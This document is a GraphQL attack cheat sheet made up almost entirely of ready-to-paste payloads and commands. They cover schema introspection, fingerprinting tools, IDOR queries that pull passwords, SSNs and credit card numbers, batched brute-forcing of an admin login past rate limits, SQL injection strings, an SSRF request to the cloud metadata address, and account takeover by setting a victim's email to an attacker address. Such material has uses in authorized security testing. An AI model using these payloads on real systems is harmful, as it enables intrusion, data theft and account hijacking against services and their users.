Full introspection query (paste as-is in POST body):

POST /graphql
Content-Type: application/json

{"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{kind name fields{name args{name type{kind name ofType{kind name}}}type{kind name ofType{kind name ofType{kind name}}}}}}}"}

Simpler — just get all type names:
{"query":"{__schema{types{name kind}}}"}

Get all queries available:
{"query":"{__schema{queryType{fields{name description args{name type{name kind}}}}}}"}

Get all mutations (write operations — most dangerous):
{"query":"{__schema{mutationType{fields{name description args{name type{name kind ofType{name kind}}}}}}}"}

Inspect a specific type:
{"query":"{__type(name:\"User\"){fields{name type{name kind ofType{name}}}}}"}

Check for disabled introspection (try alternatives):
{"query":"{__type(name:\"Query\"){fields{name}}}"}
{"query":"{__typename}"}

Graphql-voyager for visual mapping:
# Paste introspection JSON at https://ivangoncharov.github.io/graphql-voyager/

InQL (Burp extension) automated scan:
# Install InQL → Target tab → right-click → Scan with InQL

graphql-introspection-dumper:
python3 graphql_dumper.py -u http://target.com/graphql -o schema.json

IDOR via direct object ID manipulation:
POST /graphql
{"query":"{user(id:1){id username email password ssn creditCard}}"}
{"query":"{user(id:2){id username email password ssn}}"}

Batch query IDOR — enumerate all users:
[{"query":"{user(id:1){username password}}"},{"query":"{user(id:2){username password}}"},{"query":"{user(id:3){username password}}"}]

Batch to bypass rate limiting on sensitive mutations:
[{"query":"mutation{login(username:\"admin\",password:\"pass1\"){token}}"},{"query":"mutation{login(username:\"admin\",password:\"pass2\"){token}}"},{"query":"mutation{login(username:\"admin\",password:\"pass3\"){token}}"}]

SQLi via GraphQL argument:
{"query":"{users(filter:\"1' OR '1'='1\"){id username password}}"}
{"query":"{users(search:\"\" UNION SELECT username,password FROM admin_users-- -){id username}}"}

SSRF via URL argument:
{"query":"{importData(url:\"http://169.254.169.254/latest/meta-data/\"){result}}"}

Field suggestion abuse (probe for hidden fields):
{"query":"{users{passwrd}}"}
# Error: Did you mean 'password'? → confirms field exists

Account takeover via mutation:
{"query":"mutation{updateEmail(userId:2,email:\"attacker@evil.com\"){success}}"}
{"query":"mutation{resetPassword(email:\"admin@corp.com\"){message}}"}

graphw00f (engine fingerprinting):
python3 graphw00f.py -d -f -t http://target.com/graphql
